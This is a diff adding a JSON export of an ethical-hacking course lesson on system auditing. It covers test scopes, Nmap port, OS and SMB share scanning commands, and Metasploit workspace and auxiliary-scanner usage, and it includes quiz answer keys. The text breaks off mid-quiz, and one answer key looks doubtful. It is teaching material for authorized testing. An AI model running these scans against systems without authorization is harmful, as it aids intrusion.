@@ -1,0 +1,2504 @@
+{
+  "data": {
+    "lesson": {
+      "id": 1089645,
+      "key": "d14c427d-b5bb-479f-8a6b-3de7c75b6918",
+      "title": "System Auditing",
+      "semantic_type": "Lesson",
+      "is_public": true,
+      "version": "1.0.0",
+      "locale": "en-us",
+      "summary": "Use test scopes to understand the context and objectives of an audit, gather information about our target, research vulnerabilities, execute exploits, and write effective reports on our findings",
+      "lesson_type": null,
+      "display_workspace_project_only": false,
+      "resources": {
+        "files": [
+          {
+            "name": "Videos Zip File",
+            "uri": "https://zips.udacity-data.com/d14c427d-b5bb-479f-8a6b-3de7c75b6918/1089645/1618870243580/System+Auditing+Videos.zip"
+          },
+          {
+            "name": "Transcripts Zip File",
+            "uri": "https://zips.udacity-data.com/d14c427d-b5bb-479f-8a6b-3de7c75b6918/1089645/1618870236887/System+Auditing+Subtitles.zip"
+          }
+        ],
+        "google_plus_link": null,
+        "career_resource_center_link": null,
+        "coaching_appointments_link": null,
+        "office_hours_link": null,
+        "aws_provisioning_link": null
+      },
+      "project": null,
+      "lab": null,
+      "concepts": [
+        {
+          "id": 1089507,
+          "key": "1ca3dc50-ccc0-4765-863e-30288f50f511",
+          "title": "Introduction",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "1ca3dc50-ccc0-4765-863e-30288f50f511",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089503,
+              "key": "bb6f2ef5-b07c-45f6-a28d-5fcca66c0862",
+              "title": "Introduction Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## System Auditing",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089504,
+              "key": "53a7b872-13b1-4bf7-a9f4-25ee49c75c79",
+              "title": "ND350 EHND C1 L2 A01 Introduction V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "KbZ_n7oW2nA",
+                "china_cdn_id": "KbZ_n7oW2nA.mp4"
+              }
+            },
+            {
+              "id": 1102239,
+              "key": "3052c779-1b53-4059-9d69-0814f63b74e6",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "We have done a lot already with automated scanning but now it’s time to do some manual testing. This lesson will cover System Auditing. There are five key areas of focus:\n\n1. Test Scope\n1. Information Gathering\n1. Researching Vulnerabilities & Exploits\n1. Executing Exploits\n1. Report Writing\n\nWe will finish this lesson with a small discussion on why some exploits are intentionally written with bugs in the exploit code\n\nBy the end of the lesson, you will be able to:\n\n* Interpret the test scope document for audit\n* Gather and organize information about a target\n* Do vulnerability and exploit research\n* Execute exploit codes\n* Write industry-standard reports",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089513,
+          "key": "02614a04-37b1-402b-af2d-dbd22d4e3883",
+          "title": "Why System Auditing?",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "02614a04-37b1-402b-af2d-dbd22d4e3883",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089508,
+              "key": "31fae600-bae2-457d-8d51-dd91043f1f88",
+              "title": "Why System Auditing? Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Why Does System Auditing Matter?",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089509,
+              "key": "59c30249-4dd3-47bc-83bf-7ffc76e7a65b",
+              "title": "ND350 EHND C1 L2 A02 Why System Auditing V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "eI6TLPlUXoc",
+                "china_cdn_id": "eI6TLPlUXoc.mp4"
+              }
+            },
+            {
+              "id": 1089511,
+              "key": "994f540e-6cb6-4489-96ac-065339ef3a2f",
+              "title": "Why System Auditing? Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Automated Testing Is Not Enough\n\nAn automated scan may lead to false positives, false negatives, or both!  That is why a manual system audit is necessary.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122391,
+              "key": "a6004a98-69ce-4cbc-a170-332f44f2f7a8",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe583ba_3/3.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/a6004a98-69ce-4cbc-a170-332f44f2f7a8",
+              "caption": "Issues with Automated Scanning",
+              "alt": "Automated scanning can lead to false positive and false negatives",
+              "width": 500,
+              "height": 261,
+              "instructor_notes": null
+            },
+            {
+              "id": 1122394,
+              "key": "cf58387f-8143-4231-b5ee-4b32b7eaf652",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Manual Validation Can Improve Accuracy\n\n**False Positives** - We take all the findings of automated scans and test them one by one. We find the exploits and try to run them and see if the vulnerability actually exists\n\n**False Negative** - Retesting for missing items can help us avoid false negatives. Here we look for things that the automated scanner can miss, like the possibility of a chained vulnerability",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126554,
+              "key": "fe5b7e78-83ba-434c-9ee1-b7ca259ba85a",
+              "title": "Methodologies Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Security Auditing Is Not an Art, It's a Science\n\nMost organizations use a four-phase methodology for system auditing.\n\n### Four Phases of System Auditing\n\n* **Reconnaissance** - Gathering information about the target\n* **Research** - Finding known vulnerabilities and exploits on our target\n* **Validation** - Modifying the exploit code to validate vulnerabilities\n* **Reporting** - Writing a report to share the results of the audit",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1126556,
+              "key": "1dbee26e-e390-4614-bc28-e09f95503d03",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe36606_2/2.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/1dbee26e-e390-4614-bc28-e09f95503d03",
+              "caption": "Four Phases Of System Auditing",
+              "alt": "The four phases of system auditing are reconnaissance, research, validation and reporting",
+              "width": 994,
+              "height": 210,
+              "instructor_notes": null
+            },
+            {
+              "id": 1102180,
+              "key": "03c77ed8-f175-4e11-a713-f2ce54519175",
+              "title": "Question",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "03c77ed8-f175-4e11-a713-f2ce54519175",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Manual System Auditing is always done after running an Automated Scan.",
+                "answers": [
+                  {
+                    "id": "a1605872446209",
+                    "text": "True",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1605872607901",
+                    "text": "False",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1126555,
+              "key": "c3201db8-cbab-4b36-9e8e-913790707c4a",
+              "title": null,
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "c3201db8-cbab-4b36-9e8e-913790707c4a",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Which phase differentiates a manual scan from an automated scan?",
+                "answers": [
+                  {
+                    "id": "605cbfd4-0d14-4a73-8869-2df5cb36d10c",
+                    "text": "Reconnaissance",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "6cc441ea-6861-4eb0-85a7-742b556f4c45",
+                    "text": "Research",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "36d7641e-79aa-4333-8242-d85503a20d8d",
+                    "text": "Validation",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "469ea9a3-ff62-4102-af0e-a9cf02e55200",
+                    "text": "Reporting",
+                    "is_correct": false
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1126557,
+              "key": "85221b8b-778e-44d5-8b50-4b75f986322d",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## New Terms\n\n| Term | Definition |\n|-|-|\n| Reconnaissance | Gathering information about the target | \n| Reporting | Sharing the results of an audit | \n| Research | Finding known vulnerabilities and exploits | \n| Validation | Using exploit code to confirm that a vulnerability exists | ",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122939,
+              "key": "ed01de46-552c-4446-9b19-6cd42dfbefb9",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nThis article shares a similar framework for system auditing:  <a href=\"https://kirkpatrickprice.com/blog/7-stages-of-penetration-testing/\" target=\"_blank\">What Are the Penetration Testing Steps?</a>. It descrived a seven-step process that is similar to the four-step framework described above but splits the first phase into three parts and the last phase into two.\n\nIf you want to learn more about the differences between automated and manual scanning, read this article:  <a href=\"https://www.srsnodgrass.com/the-great-debate-automated-vs-manual-penetration-testing/?print=print\" target=\"_blank\">The Great Debate: Automated vs. Manual Penetration Testing.</a>",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089520,
+          "key": "5b6ea339-d1fb-4d67-9c20-c8917aea5583",
+          "title": "Test Scopes",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "5b6ea339-d1fb-4d67-9c20-c8917aea5583",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": {
+            "files": [
+              {
+                "name": "Example Test Scope",
+                "uri": "https://video.udacity-data.com/topher/2021/January/60005652_bansalx-test-scope/bansalx-test-scope.pdf"
+              }
+            ],
+            "google_plus_link": null,
+            "career_resource_center_link": null,
+            "coaching_appointments_link": null,
+            "office_hours_link": null,
+            "aws_provisioning_link": null
+          },
+          "atoms": [
+            {
+              "id": 1089514,
+              "key": "4ee8536d-2713-465a-9d62-72940683f458",
+              "title": "How Experts Approach System Auditing Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Stay In Scope",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089515,
+              "key": "6ae298c9-fbd1-4356-b7eb-85339c0f5042",
+              "title": "ND350 EHND C1 L2 A03 Test Scopes V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "wNO63YxkKWA",
+                "china_cdn_id": "wNO63YxkKWA.mp4"
+              }
+            },
+            {
+              "id": 1089516,
+              "key": "a097dd48-4968-4c91-a95f-1ce9f5f155e4",
+              "title": "How Experts Approach System Auditing Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Testing Puts Our Systems At Risk\n\nManual auditing involves using a variety of tools exploits that can break a system and cause significant disruption to the organization. A poorly executed test can cause the same type of damage as a malicious hack.\n\n### Test Scopes Limit The Risk\n\nTest scopes limit the risk by defining ***what needs to be tested ***and ***how the test should be done***. A test scope also includes the tools and resources that can be used during the test, which leads to a more controlled testing environment.\n\n### Elements Of Test Scope\n\n1. **Test Summary - **Provides a basic understanding of why the test is being conducted and what are the objectives of the test.\n1. **Work Breakdown Sheet - **Provides a high-level overview of all the tasks that need to be completed to execute the test. These can include scanning for service versions, researching vulnerabilities, validating vulnerabilities by executing exploits, scoring, and reporting findings.\n1. **Rules for The Assessment **- Defines what is allowed and what is not allowed during the test. These rules may include requirements for vulnerability impact, tools that can be used for the test,  and trusted sources for research.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1126558,
+              "key": "999d6b1b-7e20-425e-8962-b34314e8fad5",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## New Terms\n\n| Term | Definition |\n|-|-|\n| Rules for the assessment | An element in the scope that lists what is allowed and not allowed for performing an assessment. | \n| Test Summary | An element in the test scope that explains why the test is being conducted, the context for the test, and the goal of the test | \n| Work Breakdown Sheet | An element in the test scope that gives a high-level overview of the tasks to be performed | \n\n\n\n",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122942,
+              "key": "a70ceaee-bbc0-415b-85f2-ce8352e98eb4",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nTo learn more about how to create an effective test scope, read this article from PentesterLab:  <a href=\"https://blog.pentesterlab.com/scoping-f3547525f9df\" target=\"_blank\">Scoping a pentest.</a> It shares best practices and a step by step process for creating test scopes from the perspective of outsourcing the audit to a third party.",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089530,
+          "key": "665dd21b-c823-432a-91a7-3b8d21d2c1a2",
+          "title": "Quizzes: Test Scopes",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "665dd21b-c823-432a-91a7-3b8d21d2c1a2",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089527,
+              "key": "cc4845a2-11cb-4185-834f-d50644672e22",
+              "title": "Methodologies Quizzes Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Thinking About Test Scopes",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089529,
+              "key": "039288a6-6ff4-464a-999f-11c19872dcf1",
+              "title": "Methodologies Hard Quiz",
+              "semantic_type": "CheckboxQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "039288a6-6ff4-464a-999f-11c19872dcf1",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Which of these are typically present in the **Rules for the Assessment** section of the test scope? (*Hint: there is more than one correct response*)",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "Context of the assessment",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "Trusted sources for vulnerability research",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1605872116625",
+                    "text": "Tools allowed to be used in the assessment",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1605872127104",
+                    "text": "High level steps to be followed to complete the assessment",
+                    "is_correct": false
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089528,
+              "key": "a92e4ea6-ee12-410f-b6a7-e61dbe004681",
+              "title": "Methodologies Easy Quiz",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "a92e4ea6-ee12-410f-b6a7-e61dbe004681",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "True or False: Test scopes improve the ***effectiveness*** of our testing",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "True",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "False",
+                    "is_correct": true
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089545,
+          "key": "ea2f41b7-33bc-44ae-a1d6-ae77d9fd3a55",
+          "title": "Information Gathering",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "ea2f41b7-33bc-44ae-a1d6-ae77d9fd3a55",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089540,
+              "key": "283f9080-3469-46de-bd67-27739856d0f6",
+              "title": "Information Gathering Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Using A Target Database",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089541,
+              "key": "5ad2e00f-97c8-41f9-9550-e87b9dbab64e",
+              "title": "ND350 EHND C1 L2 A04 Target Databases V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "e2PDz1rNHeI",
+                "china_cdn_id": "e2PDz1rNHeI.mp4"
+              }
+            },
+            {
+              "id": 1101734,
+              "key": "e3e8d5ab-e178-4f6c-ac17-1b79e0d91f6e",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "The goal of reconnaissance is to **collect and store information** in an organized manner.  We collect information about our target including:\n\n* Open ports\n* Services running\n* Service version numbers\n* Operating system being used\n\nWe organize and store this information in a **target database**\n\n<hr>",
+              "instructor_notes": null
+            },
+            {
+              "id": 1101735,
+              "key": "af8fa263-3af4-471d-a78c-b9e30d990bec",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe58b9b_4/4.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/af8fa263-3af4-471d-a78c-b9e30d990bec",
+              "caption": "Structure Of A Target Database",
+              "alt": "A target database includes information about the port, protocol, services, version and comments",
+              "width": 800,
+              "height": 172,
+              "instructor_notes": null
+            },
+            {
+              "id": 1122396,
+              "key": "1b215681-07b5-4d5d-9a20-74a94f73172d",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Elements of Target Database\n\n1. Generally, the IP Address or the URL of the target is listed under the column **HOST**\n1. Opened ports on the target are listed under the column **PORT**\n1. Protocols of the opened ports are listed under the column **PROTO**\n1. Services running on those ports are listed under the column **SERVICE**\n1. Versions of those services found are listed under the column **VERSION**\n1. Additional Information can be stored under the column **COMMENTS**\n\n#### Simple Target Database - Pen and Paper\n\nWe could just write down all of the information using a pen and paper, but that would be very time consuming, and as the list gets longer, it would be difficult to keep organized.  \n\n#### Better Target Database - Spreadsheet\n\nA better option is to use a simple spreadsheet as our target database.  We can create a row for each bit of information and columns to store each type of data.\n\n#### Professional Target Database - Specialized Tool\n\nProfessionals often use specialized tools including Metasploit, Core-Impact, and others that make it easier to set up and manage the database.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126559,
+              "key": "9480fd1a-bbe7-480f-b3f3-35713cee07a1",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n<div class=\"index-module--table-responsive--1zG6k\"><table class=\"index-module--table--8j68C index-module--table-striped--3HHC-\">\n<thead>\n<tr>\n<th>Term</th>\n<th>Definition</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Core-Impact</td>\n<td>A commercial pentesting framework developed by Core Security that includes handcrafted premium exploits</td>\n</tr>\n<tr>\n<td>Metasploit</td>\n<td>A commercial pentesting framework developed by Rapid7</td>\n</tr>\n<tr>\n<td>Target Database</td>\n<td>A spreadsheet or specialized tool to store data collected during reconnaissance</td>\n</tr>\n</tbody>\n</table>\n</div>",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1126563,
+          "key": "c15e79b7-ee81-4f20-8d47-5d162677430f",
+          "title": "Reconnaissance With Nmap",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "c15e79b7-ee81-4f20-8d47-5d162677430f",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1126566,
+              "key": "ebef6ccc-e22d-495c-92ed-a1eec87aead8",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Getting Started With Nmap",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126565,
+              "key": "b78d450c-f636-4d5e-acf8-9f005a6ed5ce",
+              "title": "ND350 EHND C1 L2 A05a Reconnaissance With Nmap Intro V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "ln4PETzG6VI",
+                "china_cdn_id": "ln4PETzG6VI.mp4"
+              }
+            },
+            {
+              "id": 1126567,
+              "key": "9aa8084f-a9c9-45a7-aa01-719a1fb96887",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "**Nmap **is a popular tool that is used to gather information about open ports, services running on those ports, their versions, and the operating system being used by the target.\n\nNmap has the **Nmap Scripting Engine (NSE)** which provides scripts that automate tasks related to gathering specific information, for example, finding valid usernames on an SSH Server. These scripts are written by other NSE users and shared with the community\n\nWe'll be using Nmap mostly to learn about the network, but** **it can also be used for other tasks including advanced version detection, backdoor detection, vulnerability, and exploit detection.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127848,
+              "key": "cfc59ad3-da0e-4360-b948-0439b69baf93",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Getting Started With Nmap",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127847,
+              "key": "d42fc601-f232-475f-a05b-e842cbfdce9c",
+              "title": "ND350 EHND C1 L2 A05b Compile An Exploit",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "hWhbK-mCrsk",
+                "china_cdn_id": "hWhbK-mCrsk.mp4"
+              }
+            },
+            {
+              "id": 1126571,
+              "key": "683d71e6-b8ec-4610-a7da-e7e756d29131",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Gathering Information With Nmap\n\n1. To view the user manual, open a terminal and type\n```bash\nnmap\n```\n1. To scan a specific target, we add the **IP** or **URL** as a parameter\n```bash\nnmap 10.10.10.20\n```\n1. Nmap scans the top 1000 ports by default. To scan a range of ports we can specify the port range using `-p(port-range)` or use `-p-` to scan all ports.\n```bash\nnmap 10.10.10.20 -p0-65535\n```\n1. Nmap scans only TCP ports by default. To **scan UDP ports** as well, we can specify the protocol using `-sT` for TCP and `-sU` for UDP.\n```bash\nnmap 10.10.10.20 -p0-65535 -sT -sU\n```\n1. To find **versions of the service** discovered, we use `-sV`.\n```bash\nnmap 10.10.10.20 -p0-65535 -sT -sU -sV\n```",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127849,
+              "key": "337b1c31-fc87-4893-917e-40b7140046c9",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### OS Detection & Nmap Scripting Engine",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127850,
+              "key": "d8bbc7a1-b6ad-423b-9567-5fe6526b5838",
+              "title": "ND350 EHND C1 L2 A05c Execute An Exploit",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "xnTMloYhQlU",
+                "china_cdn_id": "xnTMloYhQlU.mp4"
+              }
+            },
+            {
+              "id": 1128043,
+              "key": "045366b4-771e-493b-a9ca-f193a635b5ca",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "1. Use `-O` to find the** operating system**\n```bash\nnmap 10.10.10.20 -p0-65535 -sT -sU -sV -O\n```\n\n1. To **scan a specific port**, we can use `-p(port-number)`, select an appropriate script from `/usr/share/nmap/scripts` directory and use `--script=`\n```bash\nnmap 10.10.10.20 -p139 -sT -sU -sV -O --script=smb-enum-shares\n```",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1152075,
+              "key": "b72e9f05-6eca-456d-a34f-5428b243f2a7",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Keep in Mind...\n\nJust like any other tool, NSE can make mistakes. There will be false positives as well as false negatives. You should always manually verify the results with at least two tools.\n\nFor example, if NSE shows *Anonymous on FTP* is allowed, you should manually try to login using an anonymous username and verify if NSE is correct.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126570,
+              "key": "f7b7c558-f2b2-4010-acb7-e449240b28ee",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n<div class=\"index-module--table-responsive--1zG6k\"><table class=\"index-module--table--8j68C index-module--table-striped--3HHC-\">\n<thead>\n<tr>\n<th>Term</th>\n<th>Definition</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n</tr><tr>\n<td>NMap (Network Mapper)</td>\n<td>A popular open-source reconnaissance tool</td>\n</tr>\n<tr>\n<td>NSE (Nmap Scripting Engine)</td>\n<td>A tool to write and share scripts to automate a wide variety of networking tasks</td>\n</tr>\n</tbody>\n</table>\n</div>",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1126564,
+          "key": "fec3ec51-5fd8-476d-90da-901010cc118b",
+          "title": "Metasploit Framework",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "fec3ec51-5fd8-476d-90da-901010cc118b",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1126577,
+              "key": "946cb888-803f-4923-bb6a-99ae437d0c7c",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Reconnaissance With MSF",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126572,
+              "key": "cacb6a7e-ed75-4c2b-81bd-f4070de03f95",
+              "title": "ND350 EHND C1 L2 A06 Reconnaissance With MSF V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "1gdV4BBjA4U",
+                "china_cdn_id": "1gdV4BBjA4U.mp4"
+              }
+            },
+            {
+              "id": 1126573,
+              "key": "c23b396a-9534-4235-a231-dc8c011a78eb",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "**Metasploit-Framework (MSF)** is a toolkit that includes hundreds of tools and a workspace for testing.  It automatically creates and maintains a target database in the workspace.\n\nMSF can integrate with Nmap directly by replacing Nmap with `db_nmap` for scanning. All the scan results are automatically saved in the Metasploit target database of the selected workspace.\n\nApart from the Nmap integration, Metasploit features more than 500 built-in scanners which can be used to gather specific information from multiple services and applications.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126574,
+              "key": "82661d09-fe45-4463-b57c-d74eceaae705",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Using Nmap and Metasploit-Framework\n\n1. Metasploit maintains all its data in Postgresql database so you can start the service using\n```bash\nservice postgresql start\n```\n\n1. Initialize the database and check it's configurations using `msfdb init`\n1. Launch Metasploit console using `msfconsole`\n1. Create a workspace using `workspace -a (workspace-name)`\n```bash\nworkspace -a udacity\n```\n\n1. Switch workspace using `workspace udacity`\n1. We can run Nmap commands within the Metasploit using `db_nmap` and the results will automatically get saved in the target database of the current workspace.\n```bash\ndb_nmap -p- -O -sT -sU -sV 10.10.10.20\n```\n1. To check the data stored in the target database, we use the commands `hosts` and `services`",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1126575,
+              "key": "45f21e2c-604f-4ad6-83bd-7b3dee8f4331",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Using Auxiliary Modules in Metasploit-Framework\n\nWe can do information gathering using the auxiliary modules. There are more than 500 scanners in Metasploit.\n1. Find a scanner by using`search type:auxiliary (keyword)` and specifying the type as `auxiliary`:\n```bash\nsearch type:auxiliary smb\n```\n1. To select a scanner from the list, you can use the `use (module-name)` command\n```bash\nuse auxiliary/scanner/smb/smb1\n```\n1. To check the available options of the module, We can use `show options`<br><br>\n1. To change any option, We can use `set (option) (option value)` \n```bash\nset RHOST 10.10.10.2\n```\n1. Execute the scanner using the `run` command",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1126569,
+              "key": "9974f03f-3b34-4151-8263-dc1b8d8089da",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n<div class=\"index-module--table-responsive--1zG6k\"><table class=\"index-module--table--8j68C index-module--table-striped--3HHC-\">\n<thead>\n<tr>\n<th>Term</th>\n<th>Definition</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Core-Impact</td>\n<td>A commercial pentesting framework developed by Core Security that includes handcrafted premium exploits</td>\n</tr>\n<tr>\n<td>Metasploit</td>\n<td>A commercial pentesting framework developed by Rapid7</td>\n</tr>\n<tr>\n<td>NMap (Network Mapper)</td>\n<td>A popular open-source reconnaissance tool</td>\n</tr>\n<tr>\n<td>NSE (Nmap Scripting Engine)</td>\n<td>A tool to write and share scripts to automate a wide variety of networking tasks</td>\n</tr>\n<tr>\n<td>Target Database</td>\n<td>A spreadsheet or specialized tool to store data collected during reconnaissance</td>\n</tr>\n</tbody>\n</table>\n</div>",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1126568,
+              "key": "b6fe4586-cdc5-4d5c-ac0f-4a06fdcdf49c",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\n* If you want to learn more about information gathering, you can read this guide from Security Trails:  <a href=\"https://securitytrails.com/blog/information-gathering\" target=\"_blank\">Information Gathering: Concept, Techniques, and Tools explained</a>. It contains actionable insights and information about other tools you can use.\n* To learn more about how to use Nmap, check out their documentation:  <a href=\"https://nmap.org/book/man.html\" target=\"_blank\">Nmap Reference Guide - Chapter 15</a>.  You'll refer to this guide frequently as an Ethical Hacker.\n* You can refer to this guide from Offensive Security: <a href=\"https://www.offensive-security.com/metasploit-unleashed/port-scanning/\" target=\"_blank\">Metasploit Unleashed</a> to learn more about the Metasploit-Framework.",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089549,
+          "key": "81c911f6-c6fe-4bd3-b858-36ab850fc6a2",
+          "title": "Quizzes: Information Gathering",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "81c911f6-c6fe-4bd3-b858-36ab850fc6a2",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089546,
+              "key": "d52915be-b7f7-487e-9ece-b826c1b666ff",
+              "title": "Information Gathering Quizzes Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
